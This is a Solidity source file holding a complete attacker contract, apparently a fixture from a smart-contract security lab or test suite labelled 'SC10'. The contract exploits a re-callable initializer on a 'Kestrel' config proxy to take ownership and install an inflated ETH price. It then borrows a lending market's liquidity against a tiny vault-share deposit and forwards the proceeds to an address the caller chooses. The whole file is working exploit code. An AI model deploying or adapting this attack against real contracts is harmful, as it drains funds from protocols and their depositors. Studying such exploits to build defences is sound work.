// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { KestrelConfig } from "shared/KestrelConfig.sol";
import { KestrelVault } from "kestrel/KestrelVault.sol";
import { KestrelLending } from "kestrel/KestrelLending.sol";

/// @notice SC10 attacker (Audius pattern): re-runs the risk config's initializer through the
///         proxy, naming itself owner and installing an absurd ETH price, then borrows the
///         lending market's liquidity against a sliver of vault-share collateral.
contract ConfigReinitAttacker {
    /// @notice Proxy in front of {KestrelConfig}.
    KestrelConfig public immutable config;
    /// @notice Vault whose shares are pledged.
    KestrelVault public immutable vault;
    /// @notice Target lending market.
    KestrelLending public immutable lending;

    /// @param _proxy Config proxy.
    /// @param _vault Vault.
    /// @param _lending Lending market.
    constructor(address _proxy, KestrelVault _vault, KestrelLending _lending) {
        config = KestrelConfig(_proxy);
        vault = _vault;
        lending = _lending;
    }

    /// @notice Run the attack with `msg.value` of ETH and forward the loot to `to`.
    /// @param ltvBps Loan-to-value to install.
    /// @param ethPrice ETH price to install.
    /// @param borrowAmount Debt tokens to borrow.
    /// @param to Profit recipient.
    function attack(uint256 ltvBps, uint256 ethPrice, uint256 borrowAmount, address to) external payable {
        config.initialize(address(this), ltvBps, ethPrice);
        uint256 shares = vault.deposit{ value: msg.value }(address(this), 0);
        IERC20(address(vault)).approve(address(lending), shares);
        lending.depositVaultCollateral(shares);
        lending.borrow(borrowAmount);
        IERC20 dbt = lending.debtToken();
        dbt.transfer(to, dbt.balanceOf(address(this)));
    }
}
